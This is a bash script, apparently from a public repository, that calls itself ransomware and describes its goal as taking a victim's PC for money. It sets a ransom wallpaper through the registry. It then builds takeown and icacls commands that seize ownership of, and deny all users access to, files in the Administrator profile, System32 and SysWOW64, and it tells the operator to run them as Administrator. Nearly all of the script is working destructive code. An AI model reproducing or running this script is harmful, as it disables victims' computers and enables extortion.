#!/bin/bash
# GITHUB REPO: https://github.com/independentcod/r4ns0mw4r3
# -
# This bash script will completely takover target computer making it inoperable.
# The objective is to take the PC as a ransom in order to gain money over it.
# In that situation the victims needs to pay to get his access back.
# INSTALLATION: You will need git-bash to run this script.
############
#  CONFIG  #
############
directory="C:\\USERS\\Administrator\\"
file="list.txt"
denyuser="Everyone"
ransompic="ransomed.gif"
quote='"'
rpar=")"
lpar="("
d2=":"
function setstr()
{
# Setting up strings concatenations
tgtobjstr="$quote$1$d2$lpar"
tgtobjstr+="OI"
tgtobjstr+="$rpar"
tgtobjstr+="$lpar"
tgtobjstr+="CI"
tgtobjstr+="$rpar"
tgtobjstr+="F"
tgtobjstr+="$quote"
echo $tgtobjstr;
}
function rdfile()
{
echo Reading File: $file begin.
while IFS= read -r line
do
chk $directory $line
done <"$file"
}
function  lstaccfiles()
{
ls $directory | grep .exe >>$1;
ls $directory | grep .vbs >>$1;
ls $directory | grep .cmd >>$1;
ls $directory | grep .msc >>$1;

}
function chk()
{
var="$quote$directory"
for n in "$@"
do
if [[ $n = *"."* ]]; then
var+="$n"
elif [[ $n = *" "* ]]; then
var+="$n "
elif [[ $n = *"/"* ]]; then
var+="$n\\"
fi
done
var+="$quote"
ps1="takeown.exe /D Y /A /R /F $var"
echo "$ps1";
echo "$ps1" >>Cmds.ps1;
echo "$ps2";
echo "$ps2" >>Cmds.ps1;
ps2="icacls.exe $var /inheritance:e /remove:g $(setstr $denyuser) /deny $(setstr $denyuser) /T /Q /C"
}
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $ransompic /f;
echo "Listing files and folders in $directory"
ls $directory >$file;
rdfile $file
directory="C:\\Windows\\System32\\"
echo "Listing files and folders in $directory"
lstaccfiles $file
rdfile $file
directory="C:\\Windows\\SysWOW64\\"
echo "Listing files and folders in $directory"
lstaccfiles $file
rdfile $file
cat Cmds.ps1;
echo "Now start powershell as Administrator and paste these commands in it or execute the Cmds.ps1 powershell script."